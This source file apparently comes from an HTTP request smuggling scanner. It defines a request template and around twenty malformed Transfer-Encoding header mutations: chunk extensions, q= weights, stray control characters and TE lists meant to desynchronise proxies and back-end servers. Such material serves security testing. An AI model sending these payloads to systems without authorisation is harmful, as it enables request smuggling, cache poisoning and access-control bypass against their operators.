# Chunk-extension and parameterized Transfer-Encoding mutations.
#
# Many parsers split Transfer-Encoding values on ',' or ';' inconsistently or
# fail to recognize the "chunked" token when parameters are appended. These
# mutations exercise those edge cases.

def render_template(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p


# Single-value parameterized chunked
mutations["chunkext-semi-empty"]     = render_template("Transfer-Encoding: chunked;")
mutations["chunkext-semi-space"]     = render_template("Transfer-Encoding: chunked; ")
mutations["chunkext-key-only"]       = render_template("Transfer-Encoding: chunked;ext")
mutations["chunkext-key-val"]        = render_template("Transfer-Encoding: chunked;a=b")
mutations["chunkext-quoted-val"]     = render_template("Transfer-Encoding: chunked;a=\"b\"")
mutations["chunkext-multi-param"]    = render_template("Transfer-Encoding: chunked;a=b;c=d")

# q= weighting (some parsers accept HTTP "quality" syntax on TE)
mutations["chunkext-q1"]             = render_template("Transfer-Encoding: chunked;q=1")
mutations["chunkext-q0"]             = render_template("Transfer-Encoding: chunked;q=0")
mutations["chunkext-q1-comma"]       = render_template("Transfer-Encoding: chunked;q=1, identity;q=0")

# Whitespace and control between value and extension
mutations["chunkext-tab"]            = render_template("Transfer-Encoding: chunked\t;a=b")
mutations["chunkext-cr"]             = render_template("Transfer-Encoding: chunked\r;a=b")
mutations["chunkext-vt"]             = render_template("Transfer-Encoding: chunked\x0b;a=b")

# Combined with comma-separated TE lists (RFC 9112 allows lists)
mutations["te-list-chunked-first"]   = render_template("Transfer-Encoding: chunked, gzip")
mutations["te-list-gzip-first"]      = render_template("Transfer-Encoding: gzip, chunked")
mutations["te-list-identity-chunk"]  = render_template("Transfer-Encoding: identity, chunked")
mutations["te-list-chunked-x2"]      = render_template("Transfer-Encoding: chunked, chunked")
mutations["te-list-spaces"]          = render_template("Transfer-Encoding:  chunked ,  identity ")
